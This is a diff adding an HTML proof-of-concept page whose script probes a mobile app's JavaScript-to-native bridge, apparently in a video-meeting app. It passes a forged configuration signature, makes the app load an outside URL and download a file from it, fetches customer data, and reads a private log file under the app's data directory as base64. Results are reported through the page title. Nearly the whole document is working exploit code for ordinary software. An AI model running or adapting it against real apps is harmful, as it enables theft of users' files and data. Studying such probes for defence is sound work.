@@ -1,0 +1,59 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P13</h1>
+<script>
+document.title='P13-START';
+var q=[], busy=false;
+function note(t){
+  q.push(String(t));
+  kick();
+}
+function kick(){
+  if(busy || !q.length) return;
+  busy=true;
+  document.title=q.shift();
+  setTimeout(function(){ busy=false; kick(); }, 900);
+}
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:mod+'.'+method
+  }));
+}
+function norm(res){
+  if(typeof res==='string'){
+    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:String(res).slice(0,80)}; }
+  }
+  return res||{};
+}
+window.__wmpoc=function(res){
+  res=norm(res);
+  var msg=String(res.message||JSON.stringify(res)).replace(/\|/g,'/');
+  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
+  note((deny?'D':'A')+':'+(res.callId||'?')+':'+res.code+':'+msg.slice(0,70));
+};
+var ts=String(Math.floor(Date.now()/1000));
+var cfg={corpId:'wwtest', sdkId:'1001', timestamp:ts, nonceStr:'p13nonce', signature:'deadbeef'};
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('OpenApiPlugin','GetOpenAppInfo',{}); },
+  function(){ call('OpenApiPlugin','GetCustomerData',{}); },
+  function(){ call('OpenApiPlugin','CheckJsApiConfig',{}); },
+  function(){ call('OpenApiPlugin','JsApiConfig', cfg); },
+  function(){ call('OpenApiPlugin','JsApiAgentConfig', cfg); },
+  function(){ call('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'}); },
+  function(){ call('MeetlogWebPlugin','DownloadFile',{url:'https://httpbin.org/bytes/32',fileName:'p13.bin',md5:''}); },
+  function(){ call('CommonPlugin','GetFileBase64',{path:'/data/data/com.tencent.wemeet.app/files/infiltrator_logs/infiltrator.log'}); },
+  function(){ call('CommonPlugin','GetPerformance',{}); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ setTimeout(function(){ note('P13-DONE'); }, 1500); return; }
+  try{ steps[i](); }catch(e){ note('EX:'+e); }
+  i++;
+  setTimeout(next, 800);
+}
+setTimeout(next, 400);
+</script>
+</body></html>
